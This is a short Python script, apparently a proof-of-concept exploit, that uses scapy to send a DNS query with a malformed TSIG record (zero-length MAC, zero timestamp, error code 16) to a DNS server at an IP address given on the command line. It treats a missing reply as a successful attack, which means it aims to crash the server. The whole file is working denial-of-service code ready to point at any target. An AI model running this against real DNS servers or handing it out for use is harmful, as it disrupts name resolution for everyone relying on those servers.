#!/usr/bin/python3
# coding: UTF-8

import sys
from scapy.all import DNS, DNSQR, IP, sr1, UDP, DNSRRTSIG, DNSRROPT

args = sys.argv

if len(args) == 1:
    print('Specify the target IP address in the command line argument')
    sys.exit()

# DNSのパケットを作成する
tsig = DNSRRTSIG(rrname="local-ddns", algo_name="hmac-sha256", 
                 rclass=255, mac_len=0, mac_data="", time_signed=0,
                 fudge=300, error=16)
dns_layer = DNS(rd=1, ad=1, 
                qd=DNSQR(qname='www.example.com'), ar=tsig)
dns_req = IP(dst=args[1])/UDP(dport=53)/dns_layer

response = sr1(dns_req, timeout=3)
if response is None:
    print('Maybe the attack is successful!')
else:
    print('The attack failed...')
    print(response)
